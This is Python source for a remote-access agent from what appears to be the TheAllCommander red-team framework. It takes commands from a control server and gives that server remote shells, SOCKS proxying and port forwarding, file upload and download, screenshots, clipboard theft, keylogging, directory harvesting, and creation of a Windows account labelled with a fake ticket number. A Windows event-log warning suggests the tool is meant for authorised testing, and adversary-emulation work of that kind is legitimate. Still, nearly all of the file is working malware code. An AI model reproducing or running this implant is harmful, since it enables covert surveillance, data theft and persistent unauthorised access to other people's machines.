import os
import sys
import base64
import getpass
import time
import subprocess
from subprocess import CalledProcessError
from pathlib import Path
import socket
import random
import string
import keyboard
from threading import Timer
from datetime import datetime
import queue
import shlex
import ctypes

import pyautogui
from io import BytesIO

import threading
from threading import Thread

from keylogger import Keylogger

import platform
if platform.system() == 'Windows':
	import win32clipboard
	import win32api
	import win32con
	import win32evtlog
	import win32security
	import win32evtlogutil
	import win32net
	import win32netcon

from directoryHarvester import DirectoryHarvester

def enqueue_output(out, queue):
	#for line in iter(out.readline, ''):
	#	print("Read from output: " + line)
	#	queue.put(line)
	while True:
		line = out.readline()
		if not line:
			break
		#queue.put(str(line, 'utf-8'))
		queue.put(line)
	out.close()

class SubProcessManager(Thread):
	def __init__(self, subprocessId):
		Thread.__init__(self)
		self.currentProcess = None;
		self.subprocessId = subprocessId
		self.inQueue = queue.Queue()
		self.outQueue = queue.Queue()
		self.stayAlive = True;
		self.lastCommand = None

	def run(self):
		while(self.stayAlive):
			if not self.inQueue.empty():
				newInput = self.inQueue.get()
				if self.currentProcess == None or not self.currentProcess.poll() == None:
					self.currentProcess = subprocess.Popen(shlex.split(newInput), shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
					self.currentOutputThread = Thread(target=enqueue_output, args=(self.currentProcess.stdout, self.outQueue))
					self.currentOutputThread.start()
					self.lastCommand = newInput
				else:
					self.currentProcess.stdin.write(newInput + "\n")
					self.currentProcess.stdin.flush()
			time.sleep(0.05)   
		if not self.currentProcess == None:
			self.currentProcess.kill()

	def kill(self):
		self.stayAlive = False

	def getCurrentProcessStr(self):
		if self.currentProcess is None:
			return "No Process"
		elif not self.currentProcess is None and not self.currentProcess.poll() == None:
			return self.lastCommand + " exited with code " + str(self.currentProcess.poll())
		else:
			return self.lastCommand


class SocksProxyLoop(Thread):
	def __init__(self, daemon, remote_socket, proxy_id):
		Thread.__init__(self)
		self.daemon = daemon
		self.remote_socket = remote_socket
		self.stay_alive = True
		self.proxy_id = proxy_id

	def kill(self):
		self.stay_alive = False;
        
	def close_down(self):
		self.daemon.pushSocksForward("socksproxy:" + str(self.proxy_id), "socksterminatedatdaemon".encode('ascii'))
		self.remote_socket.close()
		self.kill()
        
	def run(self):
		while self.stay_alive:
			forwardData = self.daemon.pollSocksForward("socksproxy:" + str(self.proxy_id))
			if forwardData:
				try:
					self.remote_socket.send(forwardData)
				except Exception:
					self.close_down()
			try:
				data = self.remote_socket.recv(4096)
				if data:
					self.daemon.pushSocksForward("socksproxy:" + str(self.proxy_id), data)
			except socket.timeout as e:
				dummy=1
			except Exception as e:
				#print("Cannot connect {}".format(e), file=sys.stderr)        
				self.close_down()
			time.sleep(0.05)

class PortForwardOutboundLoop(Thread):
	def __init__(self, daemon, targetHost, targetPort, remoteSocket, socketLock):
		# Call the Thread class's init function
		Thread.__init__(self)
		self.daemon = daemon
		self.targetHost = targetHost
		self.targetPort = targetPort
		self.remoteSocket = remoteSocket
		self.stayAlive = True;
		self.socketLock = socketLock
		self.hasStartedTransmission = False;

	def kill(self):
		self.stayAlive = False;

	def setInboundLoop(self, inloop):
		self.inloop = inloop;

	def run(self):
		while self.stayAlive:
			forwardData = self.daemon.pollForward(self.targetHost + ":" + str(self.targetPort))
			if forwardData:
				try:
					self.socketLock.acquire()
					if not self.hasStartedTransmission:
						self.remoteSocket.connect((self.targetHost, self.targetPort))
						self.hasStartedTransmission = True
						self.inloop.notify_begin_xmit()
					self.remoteSocket.send(forwardData)
				except Exception as e:
					print("Cannot connect {}".format(e), file=sys.stderr)
				self.socketLock.release()    
			time.sleep(0.1)    

	def updateSocket(self, newSocket):
		self.remoteSocket = newSocket

class PortForwardInboundLoop(Thread):
	def __init__(self, daemon, targetHost, targetPort, remoteSocket, socketLock, outboundLoop):
		# Call the Thread class's init function
		Thread.__init__(self)
		self.daemon = daemon
		self.targetHost = targetHost
		self.targetPort = targetPort
		self.remoteSocket = remoteSocket
		self.stayAlive = True;
		self.socketLock = socketLock
		self.outboundLoop = outboundLoop
		self.hasStartedTransmission = False;

	def kill(self):
		self.stayAlive = False;

	def notify_begin_xmit(self):
		self.hasStartedTransmission = True;

	def run(self):
		while self.stayAlive:
			# we set a 2 second timeout; depending on your
			# target, this may need to be adjusted
			self.remoteSocket.settimeout(2)
			dummy = 0
			try:
				if not self.hasStartedTransmission:
					time.sleep(0.1)
					continue
				# keep reading into the buffer until
				# there's no more data or we timeout

				data = self.remoteSocket.recv(4096)
				if data:
					self.daemon.pushForward(self.targetHost + ":" + str(self.targetPort), data)
			except socket.timeout:
				dummy=1
			except Exception as e:
				print("Cannot connect {}".format(e), file=sys.stderr)
				reconnected = False;
				self.socketLock.acquire()
				while not reconnected: 
					try:
						remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						remoteSocket.connect((self.targetHost, self.targetPort))
						reconnected = True
						self.remoteSocket = remoteSocket
						self.outboundLoop.updateSocket(remoteSocket)
					except Exception as e:    
						print("Cannot connect {}".format(e), file=sys.stderr)        
				self.socketLock.release()        

class LocalAgent:
	harvester_server = '127.0.0.1'
	harvester_port = 8010

	shellIdCounter = 0
	sessionsDict = {}
	currentSessionId = None

	def __init__(self):
		self.daemonUID = self.makeUID();
		self.isElevated = self.isElevatedWindowsProcess();

	def makeUID(self):
		letters = string.ascii_letters
		return ''.join(random.choice(letters) for i in range(16))

	socksDict = {}
	outboundLooperDict = {}
	inboundLooperDict = {}
	directoryHarvesterDict = {}
	next_harvest_session_id = 1

	def takeScreenshot(self, postScreenshot):
		image = pyautogui.screenshot()
		im_file = BytesIO()
		image.save(im_file, format="JPEG")
		im_bytes = im_file.getvalue()  # im_bytes: image in binary format.
		im_b64 = base64.b64encode(im_bytes).decode('ascii')
		self.postScreenshot(im_b64)
		if postScreenshot:
			self.postResponse("Screenshot successful")
        
	def buildCatContent(self):
		continueBuilding = True
		content = ""
		while continueBuilding:
			command = self.pollCommand()
			if command == None:
				sleep_int = 1 + (random.randint(1,500) / 1000)
				time.sleep(sleep_int)
			elif command == '<done>':
				continueBuilding = False
			elif command == '<cancel>':
				return ""
			else:
				#Why write a \n character instead of os.linesep? b/c python
                #tried to be helpful and autocorrects your os.linesep to \r\r\n on
                #windows when writing a text file. So helpful...
				content = content + command + '\n'
		return content

	def readFile(self, filename, lineNums):
		try:
			file = open(filename, 'r')
			lines = file.readlines()
			count = 0
			content = ""
			for line in lines:
				count += 1
				if lineNums:
					content = content + str(count) + ": "
				content = content + line + "\n"
			self.postResponse(content)
			file.close()
		except:
			self.postResponse("Invalid cat directive")

	def postHarvest(self, cmd_output, harvestType):
		raise NotImplementedError("Please Implement this method")

	def postDirHarvest(self, content, session_id):
		raise NotImplementedError("Please Implement this method")

	def postScreenshot(self, cmd_output):
		raise NotImplementedError("Please Implement this method")

	def postKeylogger(self, log):
		raise NotImplementedError("Please Implement this method")

	def postResponse(self, cmd_output):
		raise NotImplementedError("Please Implement this method")

	def pollServer(self):
		raise NotImplementedError("Please Implement this method") 

	def pollSocksForward(self, forwardID):
		raise NotImplementedError("Please Implement this method") 

	def pushSocksForward(self, forwardID, data):
		raise NotImplementedError("Please Implement this method") 

	def pollForward(self, forwardID):
		raise NotImplementedError("Please Implement this method") 

	def pushForward(self, forwardID, data):
		raise NotImplementedError("Please Implement this method") 

	def getScriptName(self):
		raise NotImplementedError("Please Implement this method") 

	def getDaemonStartupCmd(self):
		return sys.executable + " " + self.getScriptName()

	def harvestCurrentDirectory(self):
		harvester = DirectoryHarvester(os.path.abspath(os.getcwd()), self, self.harvester_server, self.harvester_port, self.next_harvest_session_id, True)
		harvester.start()
		self.directoryHarvesterDict[os.path.abspath(os.getcwd())] = harvester
		self.next_harvest_session_id += 1
		self.postResponse("Started Harvest: " + os.path.abspath(os.getcwd()))

	def listActiveHarvests(self):
		idx = 0
		killList = list()
		for key in self.directoryHarvesterDict:
			if self.directoryHarvesterDict[key].isComplete():
				killList.append(key)
			else:
				self.postResponse(str(idx) + " : " + key)
				idx = idx + 1
		for key in killList:
			del self.directoryHarvesterDict[key]
		if idx == 0:
			self.postResponse("No active harvests")
                
	def killHarvest(self, harvest):
		idx = 0
		target = None
		for key in self.directoryHarvesterDict:
			if(idx == harvest):
				self.directoryHarvesterDict[key].kill()
				target = key
			idx = idx + 1
		if target:
			del self.directoryHarvesterDict[key]
			self.postResponse("Harvester terminated: " + target)

	def killAllHarvests(self):
		killList = list()
		for key in self.directoryHarvesterDict:
			self.directoryHarvesterDict[key].kill()
			killList.append(key)
		for key in killList:
			del self.directoryHarvesterDict[key]

	def processNewForwardRequest(self, request):
		elements = request.split(" ")
		if(len(elements) != 4):
			return "Invalid argument: need 'proxy <ip> <remote port> <forward port>'"

		try:
			port = int(elements[2])
			remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			#remote_socket.connect((elements[1], port))   
			uidStr = elements[1] + ":" + elements[2]
			socketLock = threading.Lock()
			self.outboundLooperDict[uidStr] = PortForwardOutboundLoop(self, elements[1], port, remote_socket, socketLock)
			self.outboundLooperDict.get(uidStr).start()
			self.inboundLooperDict[uidStr] = PortForwardInboundLoop(self, elements[1], port, remote_socket, socketLock, self.outboundLooperDict.get(uidStr))
			self.inboundLooperDict.get(uidStr).start()
			self.outboundLooperDict.get(uidStr).setInboundLoop(self.inboundLooperDict.get(uidStr))
		except Exception as e:
			print("Cannot connect {}".format(e), file=sys.stderr)
			self.postResponse("Cannot connect to specified host")    
		self.postResponse("Proxy established")    
		return None
    
	def process_new_socks_request(self, request):        
		elements = request.split(" ")
		remote_host = None
		remote_port = None
		if(len(elements) != 4 and len(elements) != 3):
			return "Invalid argument: need 'startSocks proxyID:<id> <remote host> <remote port>'"
		if(len(elements) == 3):
			addr_elements = elements[2].split(":")
			if(len(addr_elements) != 2):
				return "Improper IP/port: " + elements[2]
			remote_port = addr_elements[1]
			remote_host = addr_elements[0][1:]
		if(len(elements) == 4):
			remote_host = elements[2]
			remote_port = elements[3]
		try:
			port = int(remote_port)
			remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			remote_socket.connect((remote_host, port))   
			remote_socket.settimeout(.01)
			uidStr = elements[1]
			proxy_id = uidStr[len("proxyID:")]
			self.socksDict[uidStr] = SocksProxyLoop(self, remote_socket, proxy_id)
			self.socksDict.get(uidStr).start()
			self.postResponse("socksEstablished")    
		except Exception as e:
			print("Cannot connect {}".format(e), file=sys.stderr)
			self.postResponse("Cannot connect to specified host")    
		return None    
        
	def kill_all_socks(self):
		killList = list()
		for key in self.socksDict:
			self.socksDict[key].kill()
			killList.append(key)
		for key in killList:
			del self.socksDict[key]

	def kill_socks_request(self, request):
		elements = request.split(" ")
		if(len(elements) != 2):
			return "Invalid argument: need 'killSocks proxyID:<id>"
		uidStr = elements[1]
		try:
			self.socksDict.get(uidStr).kill()
			del self.socksDict[uidStr]
		except Exception as e:
			return None

	def processProxyConfirm(self, response):    
		elements = response.split(" ")
		if elements[1] in self.outboundLooperDict:
			self.postResponse("yes")
		else:
			self.postResponse("no")

	def processForwardRemove(self, request):
		elements = request.split(" ")
		if(len(elements) != 3):
			self.postResponse("Invalid argument: need 'killproxy <ip> <port>'")
		uidStr = elements[1] + ":" + elements[2]    
		if uidStr in self.outboundLooperDict:
			self.outboundLooperDict.get(uidStr).kill()
			del self.outboundLooperDict[uidStr]
		if uidStr in self.inboundLooperDict:
			self.inboundLooperDict.get(uidStr).kill()
			del self.inboundLooperDict[uidStr]
		self.postResponse("proxy terminated")    

	def pollCommand(self):
		response = self.pollServer()

		if response == "shell_background":
			self.currentSessionId = None
			self.postResponse("Proceeding in main shell")
			return None		
		elif response == "shell_kill":
			if self.currentSessionId and self.currentSessionId in self.sessionsDict:
				self.sessionsDict[self.currentSessionId].kill()
				del self.sessionsDict[self.currentSessionId]
				self.currentSessionId = None
				self.postResponse("Session Destroyed")
			else:
				self.postResponse("No current session")
			return None
		elif not self.currentSessionId == None:
			if not response == '<control> No Command':
				self.sessionsDict[self.currentSessionId].inQueue.put(response)
			output = None
			try:
				while True:
					tmp_output = self.sessionsDict[self.currentSessionId].outQueue.get_nowait()
					if output == None:
						output = tmp_output
					else:
						output = output + tmp_output
			except queue.Empty as e:
				n=1
			if output:
				self.postResponse(output)
			return None    

		if response == '<control> No Command':
			return None
		elif response == "os_heritage":
			if platform.system() == "Darwin":
				self.postResponse("Mac")
			else:
				self.postResponse(platform.system());
		elif response.startswith("where "):
			#We want to run the command with a timeout and cache all IO for a single transmission back to controller
			try:
				self.postResponse("Attempting search with 10 minute timeout")
				output = subprocess.check_output(response, stderr=subprocess.STDOUT, timeout=600)
				self.postResponse(output.decode('utf-8'))
				self.postResponse("Search complete")
			except CalledProcessError as e:
				if(e.returncode == 1):
					self.postResponse("Search complete with no findings")
				else:    
					self.postResponse("Cannot execute command {}".format(e))
		elif response == "shell":
			self.currentSessionId = str(self.shellIdCounter)
			self.shellIdCounter += 1
			self.sessionsDict[self.currentSessionId] = SubProcessManager(self.currentSessionId)
			self.sessionsDict[self.currentSessionId].start()
			self.postResponse("Shell Launched: " + self.currentSessionId)
			return None
		elif response == "shell_list":
			if len(self.sessionsDict) == 0:
				self.postResponse("No shells active")
			else:    
				val = "Sessions available: \n"
				for key in self.sessionsDict:
					val = val + "Shell " + key + ": " + self.sessionsDict[key].getCurrentProcessStr() + "\n";
				self.postResponse(val)
			return None                            
		elif response.startswith("shell_kill "):
			#Kill one of the shells
			elements = response.split(" ")
			if not len(elements) == 2:
				self.postResponse("shell_kill <session id>")
			else:
				if elements[1] in self.sessionsDict:
					self.sessionsDict[str(elements[1])].kill()
					del self.sessionsDict[str(elements[1])]
					self.postResponse("Session destroyed: " + str(elements[1]))
				else:
					self.postResponse("Session not available")            
			return None                    
		elif response.startswith("shell "):
			#Specify shell to switch to
			elements = response.split(" ")
			if not len(elements) == 2:
				self.postResponse("shell <session id>")
			else:
				if str(elements[1]) in self.sessionsDict:
					self.currentSessionId = str(elements[1])
					self.postResponse("Active Session: " + self.currentSessionId)
				else:
					self.postResponse("Session not available")
			return None        
		elif response == "get_daemon_start_cmd":
			self.postResponse(self.getDaemonStartupCmd())
			return None
		elif response.startswith("<control> download "):
			elements = response.split(" ")
			if len(elements) >= 4:
				try:
					binary = base64.decodebytes(elements[len(elements) - 1].encode('ascii'))
					filename = elements[2]
					idx = 3
					while idx < (len(elements) - 1):
						filename = filename + " " + elements[idx]
						idx = idx + 1
					f = open(filename, 'wb+')
					f.write(binary)
					f.close()
					self.postResponse("File written: " + filename)
				except Exception as e:
					self.postResponse("Invalid download directive")
			else:
				self.postResponse("Invalid download directive")
			return None
		elif response.startswith("uplink "):
			filename = response[len("uplink "):]
			try:
				file = open(filename, 'rb')
				file_read = file.read() 
				file.close()
				self.postResponse("<control> uplinked " + os.path.basename(file.name) + " " + base64.encodebytes(file_read).decode('ascii').replace("\n", ""))
			except:
				self.postResponse("Invalid uplink directive")
			return None
		elif response.startswith("getuid"):
			username = getpass.getuser()
			homedir = str(Path.home())
			hostname = socket.gethostname()
			response_str = "Username: " + username + "\n"
			response_str = response_str + "Home Directory: " + homedir + "\n"
			response_str = response_str + "Hostname: " + hostname + "\n"
			self.postResponse(response_str)
			return None
		elif response.startswith("ps"):
			return "tasklist"
		elif response.startswith("proxy"):
			return self.processNewForwardRequest(response)
		elif response.startswith("killproxy"):
			return self.processForwardRemove(response)
		elif response.startswith("cd "):
			relative = response[len("cd "):]
			try:
				os.chdir(os.path.join(os.path.abspath(os.getcwd()), relative))
			except:
				self.postResponse("Invalid directory traversal")
			self.postResponse(os.getcwd())
			return None
		elif response == 'listActiveHarvests':
			self.listActiveHarvests()
		elif response == 'kill_all_harvests':
			self.killAllHarvests()
			self.postResponse("All harvests terminated")
		elif response.startswith('kill_harvest'):
			elements = response.split(" ")
			if len(elements) == 2:
				if not elements[1].isnumeric():
					self.postResponse("Invalid kill_harvest command")
				else:
					self.killHarvest(int(elements[1]))
			else:
				self.postResponse("Invalid kill_harvest command")
		elif response == 'harvest_pwd':
			self.harvestCurrentDirectory()
			return None
		elif response == 'pwd':
			self.postResponse(os.getcwd())
			return None
		elif response.startswith('add_hidden_user'):
			elements = response.split(" ")
			if not ctypes.windll.shell32.IsUserAnAdmin():
				self.postResponse("Unable to add user, not administrator")
				return None
			if len(elements) == 3:
				d={}
				d['name'] = elements[1]
				d['password'] = elements[2]
				d['comment'] = "User added via ticket #24601"
				d['flags'] = win32netcon.UF_WORKSTATION_TRUST_ACCOUNT
				d['priv'] = win32netcon.USER_PRIV_USER
				try:
					win32net.NetUserAdd(None, 1, d)
					self.postResponse("SUCCESS")
				except Exception as e:
					self.postResponse("Oops, something went wrong: {}".format(e))
			else:
				self.postResponse("Improper format for 'add_hidden_user' command")
			return None    
		elif response == 'die':
			raise Exception('time to die')
		elif response == 'clipboard':
			if platform.system() == 'Windows':
				try:
					win32clipboard.OpenClipboard()
					data = win32clipboard.GetClipboardData()
					win32clipboard.CloseClipboard()
					self.postHarvest(data, "Clipboard")
					self.postResponse("Clipboard captured")
				except Exception as e:
					print("Oops, something went wrong: {}".format(e), file=sys.stderr)
			else:
				self.postResponse("Unsupported operation on this platform")
			return None
		elif response == 'screenshot':
			try:
				self.takeScreenshot(True)
			except Exception as e:
				print("Oops, something went wrong: {}".format(e), file=sys.stderr)            
			return None
		elif response.startswith('confirm_client_proxy'):
			self.processProxyConfirm(response)
		elif response == 'killSocks5':
			return self.kill_all_socks()
		elif response.startswith('killSocks'):
			return self.kill_socks_request(response)
		elif response.startswith('startSocks5'):
			#ServerSide command, discard
			dummy = 1
		elif response.startswith('startSocks'):
			return self.process_new_socks_request(response)    
		elif response.startswith('cat'):            
			elements = response.split(" ")  
			if len(elements) == 2:
				if elements[1].startswith('>>'):
					newContent = self.buildCatContent()
					if newContent != '':
						with open(elements[1][len(">>"):], 'a') as f:
							f.write(newContent)          
						self.postResponse("Data written")    
					else:
						self.postResponse("Abort: No file write")
				elif elements[1].startswith('>'):
					newContent = self.buildCatContent()
					if newContent != '':
						with open(elements[1][len(">"):], 'w') as f:
							f.write(newContent)
						self.postResponse("Data written")
					else:
						self.postResponse("Abort: No file write")                        
				else:               
					self.readFile(elements[1], False)
			elif len(elements) == 3:
				if elements[1] != '-n':
					self.postResponse("No valid cat interpretation")            
				else:
					self.readFile(elements[2], True)
			elif len(elements) == 4:
				if elements[2] == '>':
					try:
						file = open(elements[1], 'rb')
						file_read = file.read() 
						file.close()
						f = open(elements[3], 'wb')
						f.write(file_read)
						f.close()
						self.postResponse("File write executed")                            
					except:
						self.postResponse("Invalid cat directive")                
				elif elements[2] == '>>':
					try:
						file = open(elements[1], 'rb')
						file_read = file.read() 
						file.close()
						with open(elements[3], 'ab') as f:
							f.write(file_read)
						self.postResponse("Appended file")
					except Exception as e:
						#print("Oops, something went wrong: {}".format(e), file=sys.stderr)
						self.postResponse("Invalid cat directive")                
				else:
					self.postResponse("No valid cat interpretation")                
			else:
				self.postResponse("No valid cat interpretation")            
			return None                
		else:
			return response

	def postWindowsEventLogWarning(self):
		ph = win32api.GetCurrentProcess()
		th = win32security.OpenProcessToken(ph, win32con.TOKEN_READ)
		my_sid = win32security.GetTokenInformation(th, win32security.TokenUser)[0]
		applicationName = "TheAllCommander Python Daemon"
		eventID = 1
		category = 5	# Shell
		myType = win32evtlog.EVENTLOG_WARNING_TYPE
		descr = ["Testing In Progress", "TheAllCommander is executing a daemon test on your system. If you did not expect this test, please investigate this incident."]
		data = "TheAllCommander is executing a daemon test on your system. If you did not expect this test, please investigate this incident.".encode("ascii")
		win32evtlogutil.ReportEvent(applicationName, eventID, eventCategory=category, 
		eventType=myType, strings=descr, data=data, sid=my_sid)

	def isElevatedWindowsProcess(self):
		cmd_output = subprocess.Popen("net session 2>&1", shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
		if "Access is denied." in cmd_output:
			return False;
		else:
			return True;

	def run(self, newLineAfterCmdOutput = False, autoScreenshot = True):
		if platform.system() == 'Windows':
			self.postWindowsEventLogWarning()
		self.newLineAfterCmdOutput = newLineAfterCmdOutput
		live = True
		if platform.system() == 'Windows':        
			logger = Keylogger(60, self, autoScreenshot)
			logger.start()
		while(live):
			try:
				command = self.pollCommand()
				if command != None:
					cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8") 
					if self.newLineAfterCmdOutput:
						cmd_output = cmd_output + "\n"
					self.postResponse(cmd_output)
				else:
					sleep_int = 1 + (random.randint(1,500) / 1000)
					time.sleep(sleep_int)
			except Exception as e:
				live = False
				print("Shutting down {}".format(e), file=sys.stderr)
		for key in self.sessionsDict:
			self.sessionsDict[key].kill()
